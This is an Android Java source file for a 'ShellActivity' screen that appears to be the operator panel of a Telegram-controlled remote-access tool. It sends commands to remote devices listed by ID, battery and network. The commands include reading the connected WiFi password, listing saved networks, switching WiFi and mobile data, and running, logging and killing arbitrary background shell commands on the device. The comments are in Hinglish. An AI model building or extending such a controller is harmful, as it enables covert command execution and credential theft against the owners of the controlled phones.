package com.rx.controller;

import android.graphics.Color;
import android.graphics.Typeface;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.text.*;
import android.view.*;
import android.view.inputmethod.EditorInfo;
import android.widget.*;
import androidx.appcompat.app.AppCompatActivity;
import java.util.ArrayList;
import java.util.List;

public class ShellActivity extends AppCompatActivity
        implements TelegramController.OnUpdateListener {

    private String             deviceId;
    private TelegramController controller;
    private TextView           tvOutput;
    private EditText           etCommand;
    private ScrollView         scrollView;
    private TextView           tvHeader;
    private final Handler      handler   = new Handler(Looper.getMainLooper());
    private final List<String> history   = new ArrayList<>();
    private       int          histIdx   = -1;
    private final StringBuilder log      = new StringBuilder();
    private       boolean      waiting   = false;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_shell);

        deviceId   = getIntent().getStringExtra("device_id");
        String net = getIntent().getStringExtra("network");
        String bat = getIntent().getStringExtra("battery");

        tvOutput   = findViewById(R.id.tvOutput);
        etCommand  = findViewById(R.id.etCommand);
        scrollView = findViewById(R.id.scrollView);
        tvHeader   = findViewById(R.id.tvHeader);

        // Monospace font — terminal feel
        tvOutput.setTypeface(Typeface.MONOSPACE);

        // Header
        tvHeader.setText("📱 " + deviceId + "  📶 " + net + "  🔋 " + bat);

        // Get controller
        controller = MainActivity.getController();
        if (controller != null) controller.setListener(this);

        // Welcome message
        appendOutput("╔══════════════════════════════════╗");
        appendOutput("║   RX$  " + deviceId + "   ║");
        appendOutput("╚══════════════════════════════════╝");
        appendOutput("✅ Connected! Commands chalao...");
        appendOutput("Type 'help' for commands list");
        appendOutput("");
        showPrompt();

        // Send button
        findViewById(R.id.btnSend).setOnClickListener(v -> sendCommand());

        // Enter key
        etCommand.setOnEditorActionListener((v, actionId, event) -> {
            if (actionId == EditorInfo.IME_ACTION_SEND ||
               (event != null && event.getKeyCode() == KeyEvent.KEYCODE_ENTER)) {
                sendCommand();
                return true;
            }
            return false;
        });

        // Up/Down arrow for history (volume buttons)
        etCommand.setOnKeyListener((v, keyCode, event) -> {
            if (event.getAction() == KeyEvent.ACTION_DOWN) {
                if (keyCode == KeyEvent.KEYCODE_DPAD_UP && !history.isEmpty()) {
                    histIdx = Math.min(histIdx + 1, history.size() - 1);
                    etCommand.setText(history.get(history.size() - 1 - histIdx));
                    etCommand.setSelection(etCommand.length());
                    return true;
                }
                if (keyCode == KeyEvent.KEYCODE_DPAD_DOWN && !history.isEmpty()) {
                    histIdx = Math.max(histIdx - 1, -1);
                    etCommand.setText(histIdx < 0 ? "" : history.get(history.size()-1-histIdx));
                    etCommand.setSelection(etCommand.length());
                    return true;
                }
            }
            return false;
        });
    }

    private void sendCommand() {
        String cmd = etCommand.getText().toString().trim();
        if (cmd.isEmpty() || waiting) return;

        etCommand.setText("");
        histIdx = -1;
        history.add(cmd);

        appendOutput("RX$ " + cmd);

        // Built-in commands
        switch (cmd.toLowerCase()) {
            case "help":
                showHelp();
                showPrompt();
                return;
            case "clear":
                log.setLength(0);
                tvOutput.setText("");
                showPrompt();
                return;
            case "exit":
                finish();
                return;
        }

        // Map friendly commands
        String actual = cmd;
        switch (cmd.toLowerCase()) {
            case "status":    actual = "STATUS";    break;
            case "wifi on":   actual = "WIFI_ON";   break;
            case "wifi off":  actual = "WIFI_OFF";  break;
            case "data on":   actual = "DATA_ON";   break;
            case "data off":  actual = "DATA_OFF";  break;
            case "wifi pass": actual = "WIFI_PASS"; break;
            case "wifi list": actual = "WIFI_LIST"; break;
        }

        // BG commands
        if (cmd.toLowerCase().startsWith("bg run "))  actual = "BG_RUN "  + cmd.substring(7);
        if (cmd.toLowerCase().equals("bg list"))       actual = "BG_LIST";
        if (cmd.toLowerCase().startsWith("bg log "))  actual = "BG_LOG "  + cmd.substring(7);
        if (cmd.toLowerCase().startsWith("bg kill ")) actual = "BG_KILL " + cmd.substring(8);

        // Send to device
        waiting = true;
        appendOutput("⏳ ...");

        if (controller != null) {
            controller.sendCommand(deviceId, actual);
        }

        // Timeout — 30 sec mein response nahi aaya
        final String finalActual = actual;
        handler.postDelayed(() -> {
            if (waiting) {
                waiting = false;
                // Remove "⏳ ..." line
                String txt = log.toString();
                int lastLine = txt.lastIndexOf("⏳ ...");
                if (lastLine >= 0) {
                    log.replace(lastLine, lastLine + 7, "");
                    tvOutput.setText(log.toString());
                }
                appendOutput("⏰ Timeout (30s) — device ne respond nahi kiya");
                showPrompt();
            }
        }, 30000);
    }

    private void showHelp() {
        appendOutput("");
        appendOutput("── Commands ──────────────────────");
        appendOutput("status      Device info");
        appendOutput("wifi on/off  WiFi control");
        appendOutput("data on/off  Mobile data");
        appendOutput("wifi pass   Connected WiFi password");
        appendOutput("wifi list   Saved networks");
        appendOutput("bg run <cmd> Background mein chalu");
        appendOutput("bg list     Background processes");
        appendOutput("bg log <id> Process output");
        appendOutput("bg kill <id> Process band karo");
        appendOutput("clear       Screen clear");
        appendOutput("exit        Disconnect");
        appendOutput("──────────────────────────────────");
        appendOutput("");
    }

    private void showPrompt() {
        // Prompt line — etCommand mein hai, sirf visual indicator
        scrollToBottom();
    }

    private void appendOutput(String line) {
        log.append(line).append("\n");
        handler.post(() -> {
            tvOutput.setText(log.toString());
            scrollToBottom();
        });
    }

    private void scrollToBottom() {
        scrollView.post(() -> scrollView.fullScroll(View.FOCUS_DOWN));
    }

    // ── TelegramController callback ───────────────────────────────────
    @Override
    public void onOutput(String devId, String output) {
        if (!devId.equals(deviceId)) return;
        if (!waiting) return;
        waiting = false;

        handler.post(() -> {
            // Remove "⏳ ..." line
            String txt = log.toString();
            int lastLine = txt.lastIndexOf("⏳ ...");
            if (lastLine >= 0) {
                log.replace(lastLine, lastLine + 7, "");
                tvOutput.setText(log.toString());
            }
        });

        appendOutput(output);
        appendOutput("");
        showPrompt();
    }

    @Override
    public void onDeviceListChanged(List<Device> devices) {
        // Header update
        for (Device d : devices) {
            if (d.id.equals(deviceId)) {
                handler.post(() -> tvHeader.setText(
                    "📱 " + d.id + "  📶 " + d.network + "  🔋 " + d.battery
                    + (d.online ? "  🟢" : "  🔴 OFFLINE")
                ));
                break;
            }
        }
    }

    @Override public void onConnected() {}
    @Override public void onError(String msg) { appendOutput("❌ " + msg); }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        // Listener wapas set karo MainActivity ko
    }
}
